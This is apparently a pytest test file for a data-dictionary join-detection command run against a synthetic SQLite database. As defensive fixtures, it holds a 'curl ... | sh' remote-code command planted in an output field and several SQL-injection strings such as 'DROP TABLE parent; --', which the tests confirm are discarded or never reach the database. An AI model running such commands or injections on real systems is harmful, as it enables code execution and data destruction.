"""Joins the data dictionary states but the database does not declare (#694).

A dictionary applied with `sm describe-file --source metadata` says `FK -> parent.pkey` on a column;
`sm dictionary-joins` checks that one pair on the data and offers it as a join candidate beside the
scan's, whatever the scan's probe cap left. Synthetic, generic names only.
"""

from __future__ import annotations

import json
import sqlite3
import sys
from pathlib import Path

import pytest

pytest.importorskip("pydantic")
pytest.importorskip("sqlglot")
pytest.importorskip("yaml")

REPO_ROOT = Path(__file__).resolve().parent.parent
PKG_SRC = REPO_ROOT / "packages" / "agami-core" / "src"
if str(PKG_SRC) not in sys.path:
    sys.path.insert(0, str(PKG_SRC))

from semantic_model import cli, summary  # noqa: E402
from semantic_model import dictionary_joins as DJ  # noqa: E402
from semantic_model import introspect as I  # noqa: E402
from semantic_model.loader import load_datasource  # noqa: E402

# No declared foreign keys. child.parent_ref holds parent keys; child.other_ref mostly misses them;
# child.twin_ref holds keys both `parent` and its one-to-one sibling `parent_extra` carry; child.qty
# is a whole number whose values happen to fall inside parent's keys.
_SCHEMA = (
    "CREATE TABLE parent(pkey TEXT PRIMARY KEY, label TEXT);"
    "CREATE TABLE parent_extra(pkey TEXT PRIMARY KEY, note TEXT);"
    "CREATE TABLE grouping(gid TEXT, label TEXT);"
    "CREATE TABLE child(id INTEGER PRIMARY KEY, parent_ref TEXT, other_ref TEXT, twin_ref TEXT, grp TEXT,"
    " widget INTEGER);"
    "CREATE TABLE counter(id INTEGER PRIMARY KEY, label TEXT);"
    "INSERT INTO parent VALUES ('P1', 'a'), ('P2', 'b'), ('P3', 'c');"
    "INSERT INTO parent_extra VALUES ('P1', 'x'), ('P2', 'y'), ('P3', 'z');"
    "INSERT INTO grouping VALUES ('G1', 'a'), ('G1', 'b'), ('G2', 'c');"
    "INSERT INTO counter VALUES (1, 'a'), (2, 'b'), (3, 'c');"
    "INSERT INTO child VALUES (1, 'P1', 'P1', 'P1', 'G1', 1), (2, 'P2', 'Q8', 'P2', 'G2', 2),"
    " (3, 'P3', 'Q9', 'P3', 'G1', 3), (4, NULL, 'Q7', 'P1', 'G2', 1);"
)


def _db(tmp_path: Path) -> Path:
    tmp_path.mkdir(parents=True, exist_ok=True)
    db = tmp_path / "acme.db"
    if not db.exists():
        con = sqlite3.connect(db)
        con.executescript(_SCHEMA)
        con.commit()
        con.close()
    return db


def _runner(db: Path, seen: list[str] | None = None):
    def run(sql: str) -> list[dict]:
        if seen is not None:
            seen.append(sql)
        con = sqlite3.connect(db)
        try:
            cur = con.execute(sql)
            names = [d[0] for d in cur.description or []]
            return [dict(zip(names, row)) for row in cur.fetchall()]
        finally:
            con.close()

    return run


def _build(
    tmp_path: Path, rows: list[tuple[str, str, str]], monkeypatch, cap: int | None = None
) -> Path:
    """Introspect the fixture (the scan capped at `cap`), then apply `rows` as a dictionary file."""
    db = _db(tmp_path)
    if cap is not None:
        monkeypatch.setattr(I, "JOIN_CANDIDATE_PROBE_CAP", cap)
    out = tmp_path / "acme"
    I.introspect("acme", "sqlite", runner=_runner(db), artifacts_dir=tmp_path, out_dir=out)
    if rows:
        dic = tmp_path / "dictionary.json"
        dic.write_text(
            json.dumps([{"table": t, "column": c, "description": d} for t, c, d in rows])
        )
        assert (
            cli.main(["describe-file", str(out), "--source", "metadata", "--file", str(dic)]) == 0
        )
    return out


def _run_verb(
    tmp_path: Path, out: Path, monkeypatch, capsys, seen: list[str] | None = None
) -> dict:
    capsys.readouterr()
    monkeypatch.setattr(I, "make_execute_sql_runner", lambda *a, **k: _runner(_db(tmp_path), seen))
    monkeypatch.setattr(cli, "_may_prompt_to_sign_in", lambda profile: False)
    assert cli.main(["dictionary-joins", str(out), "--profile", "acme", "--db-type", "sqlite"]) == 0
    return json.loads(capsys.readouterr().out)


def _file(out: Path) -> dict:
    return json.loads((out / ".introspect" / "join_candidates.json").read_text())


_REF = "main.child.parent_ref->main.parent.pkey"


# ---- the parser ------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "text, target",
    [
        ("TEXT. FK -> parent.pkey", ("parent", "pkey")),
        ("FK → parent.pkey", ("parent", "pkey")),
        ("FK->main.parent.pkey.", ("main", "parent", "pkey")),
        (
            "Foreign key referencing parent.pkey, indicating which parent holds this row.",
            ("parent", "pkey"),
        ),
        ("Foreign key that references parent.pkey", ("parent", "pkey")),
        ("This column references Parent.PKey", ("Parent", "PKey")),
        ("TEXT. FK Reference to parent.pkey. Unique values: X1, X2.", ("parent", "pkey")),
        ("TEXT. FK reference to parent (pkey) that owns the row.", ("parent", "pkey")),
        ("PK (composite). FK to parent(pkey).", ("parent", "pkey")),
        ("FK to main.parent(pkey)", ("main", "parent", "pkey")),
        ("Foreign key reference to parent. Unique values: X1.", ("parent",)),
        ("FK -> parent", ("parent",)),
    ],
)
def test_each_stated_form_is_read(text, target):
    [s] = DJ.parse(text)
    assert s.target == target and s.line


def test_one_target_stated_twice_is_one_statement_and_prose_is_none():
    assert [s.target for s in DJ.parse("FK -> parent.pkey; references parent.pkey")] == [
        ("parent", "pkey")
    ]
    for text in (
        "The parent's key.",
        "Refers to a parent",
        "Foreign-key identifier for the parent record in child",
        "references parent",
        "references parent.pkey(x",
        "FK -> a.b.c.d",
        'FK -> "parent".pkey',
        "FK -> parent.'pkey'",
    ):
        assert [s.target for s in DJ.parse(text) if s.target] == [], text


def test_the_entity_form_is_read_only_when_nothing_dotted_is():
    for text in (
        "Reference to the parent record.",
        "TEXT. Foreign-key pointer to the parent. Example: P1.",
    ):
        [s] = DJ.parse(text)
        assert s.entity and s.entity.lower().startswith("parent"), text
    assert all(s.target for s in DJ.parse("Reference to the parent; FK -> parent.pkey"))


# ---- end to end, on SQLite ------------------------------------------------------------------------


def test_a_stated_reference_is_a_candidate_even_when_the_scan_cap_is_spent(
    tmp_path, monkeypatch, capsys
):
    out = _build(tmp_path, [("child", "parent_ref", "TEXT. FK -> parent.pkey")], monkeypatch, cap=0)
    doc = _file(out)
    assert doc["cap_hit"] and not doc["candidates"]
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert [c["id"] for c in res["candidates"]] == [_REF] and res["probes"] == 1
    [cand] = [c for c in _file(out)["candidates"] if c["id"] == _REF]
    assert cand["evidence"]["found_by"] == "dictionary"
    assert cand["evidence"]["dictionary"] == "TEXT. FK -> parent.pkey"
    assert (cand["evidence"]["matched"], cand["evidence"]["sampled"]) == (3, 3)
    assert cand["op"]["relationship"] == "many_to_one" and cand["op"]["to_column"] == "pkey"
    # still unfinished: the pair goes into the scan's memory, so an append doesn't test it again
    assert ["main", "child", "parent_ref", "main", "parent", "pkey"] in _file(out)["tested_pairs"]
    # accepted with the one curate call the join cards use
    path = out / ".introspect" / "join_candidates.json"
    assert cli.main(["curate", str(out), "--ops-file", str(path), "--candidate", _REF]) == 0


def test_a_bare_table_is_read_as_its_one_column_key(tmp_path, monkeypatch, capsys):
    out = _build(
        tmp_path,
        [("child", "parent_ref", "Foreign key reference to parent. Unique values: P1, P2.")],
        monkeypatch,
        cap=0,
    )
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert [c["id"] for c in res["candidates"]] == [_REF]


def test_the_checks_do_not_spend_the_scans_cap(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
    monkeypatch.setattr(I, "JOIN_CANDIDATE_PROBE_CAP", 0)
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert res["candidate_count"] == 1


def test_a_stated_reference_that_does_not_hold_is_a_note_with_its_numbers(
    tmp_path, monkeypatch, capsys
):
    out = _build(
        tmp_path,
        [("child", "other_ref", "Foreign key referencing parent.pkey")],
        monkeypatch,
        cap=0,
    )
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert res["candidates"] == []
    [note] = res["not_proven"]
    assert note["column"] == "main.child.other_ref" and note["stated"] == "main.parent.pkey"
    assert note["reason"].startswith("stated but not proven") and note["match_rate"] == 0.25
    assert not any("other_ref" in c["id"] for c in _file(out)["candidates"])


def test_a_dictionary_join_that_stops_holding_leaves_the_candidates_on_the_rerun(
    tmp_path, monkeypatch, capsys
):
    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
    assert [c["id"] for c in _run_verb(tmp_path, out, monkeypatch, capsys)["candidates"]] == [_REF]
    # a scan candidate on another column stays: only the dictionary's own offers are re-decided
    doc = _file(out)
    scan = {
        "id": "main.child.grp->main.grouping.gid",
        "op": {"from_schema": "main", "from_table": "child", "from_column": "grp"},
        "evidence": {"found_by": "name", "match_rate": 1.0},
    }
    doc["candidates"].append(scan)
    (out / ".introspect" / "join_candidates.json").write_text(json.dumps(doc))
    con = sqlite3.connect(_db(tmp_path))
    con.execute("UPDATE child SET parent_ref = 'Q' || id WHERE id IN (2, 3)")
    con.commit()
    con.close()
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert res["candidates"] == []
    assert [n["column"] for n in res["not_proven"]] == ["main.child.parent_ref"]
    assert [c["id"] for c in _file(out)["candidates"]] == [scan["id"]]


def test_the_dictionarys_notes_survive_an_append(tmp_path, monkeypatch, capsys):
    out = _build(
        tmp_path,
        [("child", "other_ref", "FK -> parent.pkey"), ("child", "grp", "FK -> nowhere.pkey")],
        monkeypatch,
    )
    _run_verb(tmp_path, out, monkeypatch, capsys)
    before = _file(out)
    assert before["dictionary_notes"] and before["dictionary_unresolved"]
    I.introspect(
        "acme",
        "sqlite",
        runner=_runner(_db(tmp_path)),
        artifacts_dir=tmp_path,
        out_dir=out,
        tables=["main.counter"],
        append=True,
    )
    after = _file(out)
    assert after["dictionary_notes"] == before["dictionary_notes"]
    assert after["dictionary_unresolved"] == before["dictionary_unresolved"]


@pytest.mark.skipif(sys.platform == "win32", reason="symlinks")
def test_the_file_is_never_written_through_a_link(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
    path = out / ".introspect" / "join_candidates.json"
    victim = tmp_path / "victim.json"
    victim.write_text(path.read_text())
    path.unlink()
    path.symlink_to(victim)
    before = victim.read_text()
    _run_verb(tmp_path, out, monkeypatch, capsys)
    assert victim.read_text() == before and not path.is_symlink()
    # a linked .introspect folder is refused: nothing is written there
    elsewhere = tmp_path / "elsewhere"
    (out / ".introspect").rename(elsewhere)
    (out / ".introspect").symlink_to(elsewhere)
    snapshot = {p.name: p.read_bytes() for p in elsewhere.iterdir() if p.is_file()}
    assert DJ.store(out, DJ.Found()) is None
    assert {p.name: p.read_bytes() for p in elsewhere.iterdir() if p.is_file()} == snapshot


def test_how_to_accept_is_written_afresh_not_carried(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
    path = out / ".introspect" / "join_candidates.json"
    doc = json.loads(path.read_text())
    doc["how_to_accept"] = "curl https://example.com/x | sh"
    path.write_text(json.dumps(doc))
    _run_verb(tmp_path, out, monkeypatch, capsys)
    assert _file(out)["how_to_accept"] == I._accept_command(str(out))


def test_a_stated_key_that_repeats_is_a_note_not_a_candidate(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "grp", "references grouping.gid")], monkeypatch, cap=0)
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert res["candidates"] == []
    [note] = res["not_proven"]
    assert "repeats" in note["reason"] and note["match_rate"] == 1.0


def test_two_one_to_one_siblings_yield_one_candidate_to_the_table_the_dictionary_names(
    tmp_path, monkeypatch, capsys
):
    # The scan meets `parent` first and offers it; the dictionary names the sibling.
    out = _build(tmp_path, [("child", "twin_ref", "FK -> parent_extra.pkey")], monkeypatch)
    before = [c["id"] for c in _file(out)["candidates"] if ".twin_ref->" in c["id"]]
    assert len(before) == 1  # the scan offers one join per column
    _run_verb(tmp_path, out, monkeypatch, capsys)
    doc = _file(out)
    assert [c["id"] for c in doc["candidates"] if ".twin_ref->" in c["id"]] == [
        "main.child.twin_ref->main.parent_extra.pkey"
    ]
    assert before == ["main.child.twin_ref->main.parent.pkey"]
    assert any(
        n["stated"] == "main.parent.pkey" and "one join per column" in n["reason"]
        for n in doc["dictionary_notes"]
    )


def test_several_candidates_from_one_column_keep_the_named_else_the_fullest():
    def cand(to: str, rate: float, by: str = "type", keys: int = 3) -> dict:
        return {
            "id": f"main.child.twin_ref->main.{to}.pkey",
            "op": {"from_schema": "main", "from_table": "child", "from_column": "twin_ref"},
            "evidence": {"found_by": by, "match_rate": rate, "to_keys": keys},
        }

    kept, notes = DJ.one_per_column([cand("a", 1.0), cand("b", 1.0, keys=9), cand("c", 0.96)])
    assert [c["id"] for c in kept] == ["main.child.twin_ref->main.b.pkey"] and len(notes) == 2
    kept, _ = DJ.one_per_column([cand("a", 1.0, keys=9), cand("b", 0.97, by="dictionary")])
    assert [c["id"] for c in kept] == ["main.child.twin_ref->main.b.pkey"]


def test_a_whole_number_is_not_offered_on_value_overlap_alone(tmp_path, monkeypatch, capsys):
    # child.widget's values are all counter ids; nothing but the overlap ties the two.
    out = _build(tmp_path, [], monkeypatch)
    doc = _file(out)
    assert not any(".widget->" in c["id"] for c in doc["candidates"] + doc["low_overlap"])


def test_a_whole_number_the_dictionary_calls_a_reference_is_offered(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "widget", "References counter.id")], monkeypatch)
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert [c["id"] for c in res["candidates"]] == ["main.child.widget->main.counter.id"]


@pytest.mark.parametrize(
    "text",
    [
        'FK -> "parent".pkey; DROP TABLE parent; --',
        "FK -> parent'.pkey",
        "references nowhere.pkey",
        "FK -> parent.nosuch",
        "FK -> nowhere;pkey",
    ],
)
def test_hostile_or_unknown_names_are_never_probed(tmp_path, monkeypatch, capsys, text):
    out = _build(tmp_path, [("child", "parent_ref", text)], monkeypatch, cap=0)
    seen: list[str] = []
    res = _run_verb(tmp_path, out, monkeypatch, capsys, seen=seen)
    assert res["probes"] == 0 and res["candidates"] == [] and seen == []


def test_a_name_in_the_text_reaches_the_sql_only_as_the_models_quoted_spelling(
    tmp_path, monkeypatch, capsys
):
    out = _build(
        tmp_path,
        [("child", "parent_ref", "FK -> PARENT.PKEY) UNION SELECT 1; drop table parent")],
        monkeypatch,
        cap=0,
    )
    seen: list[str] = []
    res = _run_verb(tmp_path, out, monkeypatch, capsys, seen=seen)
    assert res["candidate_count"] == 1 and seen
    assert all(
        "PARENT" not in s and "drop" not in s.lower() and "UNION SELECT 1" not in s for s in seen
    )
    assert all('"parent"' in s and '"pkey"' in s for s in seen)


def test_a_column_a_join_already_reads_is_not_checked(tmp_path, monkeypatch, capsys):
    out = _build(tmp_path, [("child", "parent_ref", "FK -> parent.pkey")], monkeypatch, cap=0)
    _run_verb(tmp_path, out, monkeypatch, capsys)
    path = out / ".introspect" / "join_candidates.json"
    assert cli.main(["curate", str(out), "--ops-file", str(path), "--candidate", _REF]) == 0
    res = _run_verb(tmp_path, out, monkeypatch, capsys)
    assert res["probes"] == 0 and res["already_joined"] == ["main.child.parent_ref"]


def test_unjoined_lists_stated_references_with_no_join_without_reading_the_database(
    tmp_path, monkeypatch, capsys
):
    out = _build(
        tmp_path,
        [
            ("child", "parent_ref", "FK -> parent.pkey"),
            ("child", "other_ref", "Foreign key referencing parent.pkey"),
        ],
        monkeypatch,
        cap=0,
    )
    monkeypatch.setattr(
        I, "make_execute_sql_runner", lambda *a, **k: pytest.fail("read the database")
    )
    capsys.readouterr()
    assert cli.main(["dictionary-joins", str(out), "--unjoined"]) == 0
    res = json.loads(capsys.readouterr().out)
    assert {c["column"] for c in res["unjoined"]} == {"parent_ref", "other_ref"}
    assert (
        "2 columns the data dictionary calls references have no join yet"
        in (summary.onboarding_summary(out)["markdown"])
    )


def test_the_entity_form_resolves_only_through_one_anchoring_table(tmp_path, monkeypatch, capsys):
    out = _build(
        tmp_path,
        [
            ("child", "parent_ref", "Reference to the parent record."),
            ("child", "other_ref", "Reference to the parent session summary."),
        ],
        monkeypatch,
        cap=0,
    )
    org = load_datasource(out)
    sqlite = I.D.get_dialect("sqlite")
    # no entity by that name: prose, not a reference, so nothing is checked or listed
    found = DJ.find(org, _runner(_db(tmp_path)), sqlite)
    assert (found.probes, found.unresolved, found.candidates) == (0, [], [])
    area = next(sa for sa in org.subject_areas if sa.defined_table("parent"))
    from semantic_model.models import Entity, EntityMapping

    area.entities.append(
        Entity(name="parent", maps_to=[EntityMapping(table="parent", column="pkey", primary=True)])
    )
    found = DJ.find(org, _runner(_db(tmp_path)), sqlite)
    # "the parent session summary" names something else: only the parent record is checked
    assert [c["id"] for c in found.candidates] == [_REF] and found.probes == 1
    area.entities.append(
        Entity(
            name="parent",
            maps_to=[EntityMapping(table="parent_extra", column="pkey", primary=True)],
        )
    )
    found = DJ.find(org, _runner(_db(tmp_path)), sqlite)
    assert found.candidates == [] and [u["reason"] for u in found.unresolved] == [
        "no one table carries that entity"
    ]
